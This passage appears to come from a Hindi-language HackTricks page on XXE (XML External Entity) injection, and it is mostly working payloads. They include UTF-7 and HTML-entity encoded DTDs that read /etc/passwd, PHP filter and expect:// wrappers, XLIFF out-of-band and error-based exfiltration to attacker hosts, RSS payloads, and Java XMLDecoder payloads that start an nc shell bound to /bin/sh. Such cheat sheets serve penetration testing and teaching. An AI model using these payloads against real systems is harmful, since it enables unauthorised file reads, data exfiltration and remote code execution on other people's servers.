आप यहाँ \[**"Encode Recipe**" of cyberchef] \(\[[https://gchq.github.io/CyberChef/#recipe=Encode_text%28'UTF-7](https://gchq.github.io/CyberChef/#recipe=Encode_text%28'UTF-7) %2865000%29'%29\&input=PCFET0NUWVBFIGZvbyBbPCFFTlRJVFkgZXhhbXBsZSBTWVNURU0gIi9ldGMvcGFzc3dkIj4gXT4KPHN0b2NrQ2hlY2s%2BPHByb2R1Y3RJZD4mZXhhbXBsZTs8L3Byb2R1Y3RJZD48c3RvcmVJZD4xPC9zdG9yZUlkPjwvc3RvY2tDaGVjaz4)to]\([https://gchq.github.io/CyberChef/#recipe=Encode_text%28'UTF-7 %2865000%29'%29\&input=PCFET0NUWVBFIGZvbyBbPCFFTlRJVFkgZXhhbXBsZSBTWVNURU0gIi9ldGMvcGFzc3dkIj4gXT4KPHN0b2NrQ2hlY2s%2BPHByb2R1Y3RJZD4mZXhhbXBsZTs8L3Byb2R1Y3RJZD48c3RvcmVJZD4xPC9zdG9yZUlkPjwvc3RvY2tDaGVjaz4%29to](https://gchq.github.io/CyberChef/#recipe=Encode_text%28%27UTF-7%20%2865000%29%27%29&input=PCFET0NUWVBFIGZvbyBbPCFFTlRJVFkgZXhhbXBsZSBTWVNURU0gIi9ldGMvcGFzc3dkIj4gXT4KPHN0b2NrQ2hlY2s%2BPHByb2R1Y3RJZD4mZXhhbXBsZTs8L3Byb2R1Y3RJZD48c3RvcmVJZD4xPC9zdG9yZUlkPjwvc3RvY2tDaGVjaz4%29to) को UTF-7 में परिवर्तित करने के लिए उपयोग कर सकते हैं।
```xml
<!xml version="1.0" encoding="UTF-7"?-->
+ADw-+ACE-DOCTYPE+ACA-foo+ACA-+AFs-+ADw-+ACE-ENTITY+ACA-example+ACA-SYSTEM+ACA-+ACI-/etc/passwd+ACI-+AD4-+ACA-+AF0-+AD4-+AAo-+ADw-stockCheck+AD4-+ADw-productId+AD4-+ACY-example+ADs-+ADw-/productId+AD4-+ADw-storeId+AD4-1+ADw-/storeId+AD4-+ADw-/stockCheck+AD4-
```

```xml
<?xml version="1.0" encoding="UTF-7"?>
+ADwAIQ-DOCTYPE foo+AFs +ADwAIQ-ELEMENT foo ANY +AD4
+ADwAIQ-ENTITY xxe SYSTEM +ACI-http://hack-r.be:1337+ACI +AD4AXQA+
+ADw-foo+AD4AJg-xxe+ADsAPA-/foo+AD4
```
### File:/ प्रोटोकॉल बायपास

यदि वेब PHP का उपयोग कर रहा है, तो `file:/` का उपयोग करने के बजाय आप **php wrappers**`php://filter/convert.base64-encode/resource=` का उपयोग करके **आंतरिक फ़ाइलों** तक पहुँच सकते हैं।

यदि वेब Java का उपयोग कर रहा है, तो आप [**jar: प्रोटोकॉल**](xxe-xee-xml-external-entity.md#jar-protocol) की जांच कर सकते हैं।

### HTML Entities

[**https://github.com/Ambrotd/XXE-Notes**](https://github.com/Ambrotd/XXE-Notes) से ट्रिक\
आप एक **entity के अंदर एक entity** बना सकते हैं, इसे **html entities** के साथ एन्कोड करके और फिर इसे **dtd लोड** करने के लिए कॉल कर सकते हैं।\
ध्यान दें कि उपयोग की गई **HTML Entities** **संख्यात्मक** होनी चाहिए (जैसे \[इस उदाहरण में]\([https://gchq.github.io/CyberChef/#recipe=To_HTML_Entity%28true,'Numeric entities'%29\&input=PCFFTlRJVFkgJSBkdGQgU1lTVEVNICJodHRwOi8vMTcyLjE3LjAuMTo3ODc4L2J5cGFzczIuZHRkIiA%2B)\\](<https://gchq.github.io/CyberChef/#recipe=To_HTML_Entity%28true,%27Numeric%20entities%27%29&input=PCFFTlRJVFkgJSBkdGQgU1lTVEVNICJodHRwOi8vMTcyLjE3LjAuMTo3ODc4L2J5cGFzczIuZHRkIiA%2B)%5C>)).
```xml
<?xml version="1.0" encoding="UTF-8"?><!DOCTYPE foo [<!ENTITY % a "&#x3C;&#x21;&#x45;&#x4E;&#x54;&#x49;&#x54;&#x59;&#x25;&#x64;&#x74;&#x64;&#x53;&#x59;&#x53;&#x54;&#x45;&#x4D;&#x22;&#x68;&#x74;&#x74;&#x70;&#x3A;&#x2F;&#x2F;&#x6F;&#x75;&#x72;&#x73;&#x65;&#x72;&#x76;&#x65;&#x72;&#x2E;&#x63;&#x6F;&#x6D;&#x2F;&#x62;&#x79;&#x70;&#x61;&#x73;&#x73;&#x2E;&#x64;&#x74;&#x64;&#x22;&#x3E;" >%a;%dtd;]>
<data>
<env>&exfil;</env>
</data>
```
DTD उदाहरण:
```xml
<!ENTITY % data SYSTEM "php://filter/convert.base64-encode/resource=/flag">
<!ENTITY % abt "<!ENTITY exfil SYSTEM 'http://172.17.0.1:7878/bypass.xml?%data;'>">
%abt;
%exfil;
```
## PHP Wrappers

### Base64

**निकालें** _**index.php**_
```xml
<!DOCTYPE replace [<!ENTITY xxe SYSTEM "php://filter/convert.base64-encode/resource=index.php"> ]>
```
#### **बाहरी संसाधन निकालें**
```xml
<!DOCTYPE replace [<!ENTITY xxe SYSTEM "php://filter/convert.base64-encode/resource=http://10.0.0.3"> ]>
```
### Remote code execution

**यदि PHP "expect" मॉड्यूल लोड किया गया है**
```xml
<?xml version="1.0" encoding="ISO-8859-1"?>
<!DOCTYPE foo [ <!ELEMENT foo ANY >
<!ENTITY xxe SYSTEM "expect://id" >]>
<creds>
<user>&xxe;</user>
<pass>mypass</pass>
</creds>
```
## **SOAP - XEE**
```xml
<soap:Body><foo><![CDATA[<!DOCTYPE doc [<!ENTITY % dtd SYSTEM "http://x.x.x.x:22/"> %dtd;]><xxx/>]]></foo></soap:Body>
```
## XLIFF - XXE

यह उदाहरण [https://pwn.vg/articles/2021-06/local-file-read-via-error-based-xxe](https://pwn.vg/articles/2021-06/local-file-read-via-error-based-xxe) से प्रेरित है।

XLIFF (XML Localization Interchange File Format) का उपयोग स्थानीयकरण प्रक्रियाओं में डेटा विनिमय को मानकीकृत करने के लिए किया जाता है। यह एक XML-आधारित प्रारूप है जिसका मुख्य रूप से स्थानीयकरण के दौरान उपकरणों के बीच स्थानीयकरण योग्य डेटा को स्थानांतरित करने और CAT (Computer-Aided Translation) उपकरणों के लिए एक सामान्य विनिमय प्रारूप के रूप में उपयोग किया जाता है।

### Blind Request Analysis

सर्वर को निम्नलिखित सामग्री के साथ एक अनुरोध किया जाता है:
```xml
------WebKitFormBoundaryqBdAsEtYaBjTArl3
Content-Disposition: form-data; name="file"; filename="xxe.xliff"
Content-Type: application/x-xliff+xml

<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE XXE [
<!ENTITY % remote SYSTEM "http://redacted.burpcollaborator.net/?xxe_test"> %remote; ]>
<xliff srcLang="en" trgLang="ms-MY" version="2.0"></xliff>
------WebKitFormBoundaryqBdAsEtYaBjTArl3--
```
हालांकि, यह अनुरोध एक आंतरिक सर्वर त्रुटि को सक्रिय करता है, जो विशेष रूप से मार्कअप घोषणाओं के साथ एक समस्या का उल्लेख करता है:
```json
{
"status": 500,
"error": "Internal Server Error",
"message": "Error systemId: http://redacted.burpcollaborator.net/?xxe_test; The markup declarations contained or pointed to by the document type declaration must be well-formed."
}
```
त्रुटि के बावजूद, बर्प सहयोगी पर एक हिट दर्ज की जाती है, जो बाहरी इकाई के साथ कुछ स्तर की बातचीत को इंगित करती है।

आउट ऑफ बैंड डेटा एक्सफिल्ट्रेशन डेटा को एक्सफिल्ट्रेट करने के लिए, एक संशोधित अनुरोध भेजा जाता है:
```
------WebKitFormBoundaryqBdAsEtYaBjTArl3
Content-Disposition: form-data; name="file"; filename="xxe.xliff"
Content-Type: application/x-xliff+xml

<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE XXE [
<!ENTITY % remote SYSTEM "http://attacker.com/evil.dtd"> %remote; ]>
<xliff srcLang="en" trgLang="ms-MY" version="2.0"></xliff>
------WebKitFormBoundaryqBdAsEtYaBjTArl3--
```
यह दृष्टिकोण यह प्रकट करता है कि यूजर एजेंट Java 1.8 के उपयोग को इंगित करता है। इस संस्करण के Java के साथ एक उल्लेखनीय सीमा यह है कि यह Out of Band तकनीक का उपयोग करके newline कैरेक्टर वाले फ़ाइलों को पुनः प्राप्त करने में असमर्थ है, जैसे कि /etc/passwd।

Error-Based Data Exfiltration इस सीमा को पार करने के लिए, एक Error-Based दृष्टिकोण का उपयोग किया जाता है। DTD फ़ाइल को इस प्रकार संरचित किया गया है कि यह एक त्रुटि को ट्रिगर करे जिसमें लक्षित फ़ाइल से डेटा शामिल हो:
```xml
<!ENTITY % data SYSTEM "file:///etc/passwd">
<!ENTITY % foo "<!ENTITY &#37; xxe SYSTEM 'file:///nofile/'>">
%foo;
%xxe;
```
सर्वर एक त्रुटि के साथ प्रतिक्रिया करता है, जो महत्वपूर्ण रूप से गैर-मौजूद फ़ाइल को दर्शाता है, यह संकेत करते हुए कि सर्वर निर्दिष्ट फ़ाइल तक पहुँचने का प्रयास कर रहा है:
```javascript
{"status":500,"error":"Internal Server Error","message":"IO error.\nReason: /nofile (No such file or directory)"}
```
त्रुटि संदेश में फ़ाइल की सामग्री शामिल करने के लिए, DTD फ़ाइल को समायोजित किया जाता है:
```xml
<!ENTITY % data SYSTEM "file:///etc/passwd">
<!ENTITY % foo "<!ENTITY &#37; xxe SYSTEM 'file:///nofile/%data;'>">
%foo;
%xxe;
```
यह संशोधन फ़ाइल की सामग्री के सफल एक्सफिल्ट्रेशन की ओर ले जाता है, क्योंकि यह HTTP के माध्यम से भेजे गए त्रुटि आउटपुट में परिलक्षित होता है। यह एक सफल XXE (XML External Entity) हमले को इंगित करता है, जो संवेदनशील जानकारी निकालने के लिए आउट ऑफ बैंड और त्रुटि-आधारित तकनीकों दोनों का लाभ उठाता है।

## RSS - XEE

XXE भेद्यता का लाभ उठाने के लिए RSS प्रारूप के साथ मान्य XML।

### Ping back

हमलावर के सर्वर के लिए सरल HTTP अनुरोध
```xml
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE title [ <!ELEMENT title ANY >
<!ENTITY xxe SYSTEM "http://<AttackIP>/rssXXE" >]>
<rss version="2.0" xmlns:atom="http://www.w3.org/2005/Atom">
<channel>
<title>XXE Test Blog</title>
<link>http://example.com/</link>
<description>XXE Test Blog</description>
<lastBuildDate>Mon, 02 Feb 2015 00:00:00 -0000</lastBuildDate>
<item>
<title>&xxe;</title>
<link>http://example.com</link>
<description>Test Post</description>
<author>author@example.com</author>
<pubDate>Mon, 02 Feb 2015 00:00:00 -0000</pubDate>
</item>
</channel>
</rss>
```
### फ़ाइल पढ़ें
```xml
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE title [ <!ELEMENT title ANY >
<!ENTITY xxe SYSTEM "file:///etc/passwd" >]>
<rss version="2.0" xmlns:atom="http://www.w3.org/2005/Atom">
<channel>
<title>The Blog</title>
<link>http://example.com/</link>
<description>A blog about things</description>
<lastBuildDate>Mon, 03 Feb 2014 00:00:00 -0000</lastBuildDate>
<item>
<title>&xxe;</title>
<link>http://example.com</link>
<description>a post</description>
<author>author@example.com</author>
<pubDate>Mon, 03 Feb 2014 00:00:00 -0000</pubDate>
</item>
</channel>
</rss>
```
### स्रोत कोड पढ़ें

PHP base64 फ़िल्टर का उपयोग करना
```xml
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE title [ <!ELEMENT title ANY >
<!ENTITY xxe SYSTEM "php://filter/convert.base64-encode/resource=file:///challenge/web-serveur/ch29/index.php" >]>
<rss version="2.0" xmlns:atom="http://www.w3.org/2005/Atom">
<channel>
<title>The Blog</title>
<link>http://example.com/</link>
<description>A blog about things</description>
<lastBuildDate>Mon, 03 Feb 2014 00:00:00 -0000</lastBuildDate>
<item>
<title>&xxe;</title>
<link>http://example.com</link>
<description>a post</description>
<author>author@example.com</author>
<pubDate>Mon, 03 Feb 2014 00:00:00 -0000</pubDate>
</item>
</channel>
</rss>
```
## Java XMLDecoder XEE to RCE

XMLDecoder एक Java क्लास है जो XML संदेश के आधार पर ऑब्जेक्ट बनाती है। यदि एक दुर्भावनापूर्ण उपयोगकर्ता किसी एप्लिकेशन को **readObject** मेथड में मनमाने डेटा का उपयोग करने के लिए मजबूर कर सकता है, तो वह तुरंत सर्वर पर कोड निष्पादन प्राप्त कर लेगा।

### Using Runtime().exec()
```xml
<?xml version="1.0" encoding="UTF-8"?>
<java version="1.7.0_21" class="java.beans.XMLDecoder">
<object class="java.lang.Runtime" method="getRuntime">
<void method="exec">
<array class="java.lang.String" length="6">
<void index="0">
<string>/usr/bin/nc</string>
</void>
<void index="1">
<string>-l</string>
</void>
<void index="2">
<string>-p</string>
</void>
<void index="3">
<string>9999</string>
</void>
<void index="4">
<string>-e</string>
</void>
<void index="5">
<string>/bin/sh</string>
</void>
</array>
</void>
</object>
</java>
```
### ProcessBuilder
```xml
<?xml version="1.0" encoding="UTF-8"?>
<java version="1.7.0_21" class="java.beans.XMLDecoder">
<void class="java.lang.ProcessBuilder">
<array class="java.lang.String" length="6">
<void index="0">
<string>/usr/bin/nc</string>
</void>
<void index="1">
<string>-l</string>
</void>
<void index="2">
<string>-p</string>
</void>
<void index="3">
<string>9999</string>
</void>
<void index="4">
<string>-e</string>
</void>
<void index="5">
<string>/bin/sh</string>
</void>
</array>
<void method="start" id="process">
</void>
</void>
</java>
```
## Tools

{% embed url="https://github.com/luisfontes19/xxexploiter" %}

## References

- [https://media.blackhat.com/eu-13/briefings/Osipov/bh-eu-13-XML-data-osipov-slides.pdf](https://media.blackhat.com/eu-13/briefings/Osipov/bh-eu-13-XML-data-osipov-slides.pdf)\\
- [https://web-in-security.blogspot.com/2016/03/xxe-cheat-sheet.html](https://web-in-security.blogspot.com/2016/03/xxe-cheat-sheet.html)\\
- HTTP के माध्यम से अपनी बाहरी DTD का उपयोग करके जानकारी निकालें: [https://ysx.me.uk/from-rss-to-xxe-feed-parsing-on-hootsuite/](https://ysx.me.uk/from-rss-to-xxe-feed-parsing-on-hootsuite/)\\
- [https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/XXE%20injection](https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/XXE%20injection)\\
- [https://gist.github.com/staaldraad/01415b990939494879b4](https://gist.github.com/staaldraad/01415b990939494879b4)\\
- [https://medium.com/@onehackman/exploiting-xml-external-entity-xxe-injections-b0e3eac388f9](https://medium.com/@onehackman/exploiting-xml-external-entity-xxe-injections-b0e3eac388f9)\\
- [https://portswigger.net/web-security/xxe](https://portswigger.net/web-security/xxe)\\
- [https://gosecure.github.io/xxe-workshop/#7](https://gosecure.github.io/xxe-workshop/#7)


{{#include ../banners/hacktricks-training.md}}
